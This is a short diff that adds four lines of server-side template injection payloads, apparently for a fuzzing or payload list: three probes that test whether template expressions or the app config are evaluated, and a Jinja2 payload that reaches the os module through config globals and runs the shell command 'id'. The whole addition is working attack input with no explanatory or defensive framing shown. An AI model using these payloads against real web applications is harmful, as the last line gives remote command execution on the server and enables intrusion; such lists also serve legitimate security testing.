@@ -1,0 +1,4 @@
+{{7*7}}
+${7*7}
+{{config}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
